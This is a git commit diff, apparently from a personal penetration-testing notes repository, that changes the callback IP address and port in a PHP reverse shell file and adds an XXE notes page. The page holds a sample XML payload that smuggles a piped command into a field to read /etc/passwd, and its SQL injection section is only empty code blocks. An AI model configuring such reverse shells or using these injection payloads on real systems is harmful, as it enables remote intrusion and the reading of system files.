004839903df4f75f1f6f3c819e88c240832fddd3
unkn0wnxxx <novumgal@gmail.com>
2025-10-30 09:58:57 -0400

    Added Methodologies

--- ReverseShell/php_reverse_shell.php
+++ ReverseShell/php_reverse_shell.php
@@ -46,8 +46,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '10.21.156.104';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
+$ip = '10.10.14.186';  // CHANGE THIS
+$port = 1337;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
---
+++ Services/XML/XXE.md
@@ -0,0 +1,30 @@
+## XXE
+
+#### Command Injection
+
+```
+<template>
+<command>dir</command>
+<exec>whoami</exec>
+<file>| cat /etc/passwd</file>
+</template>
+```
+
+#### SQL Injection
+
+```
+
+```
+
+
+
+
+```
+
+```
+
+
+
+```
+
+```
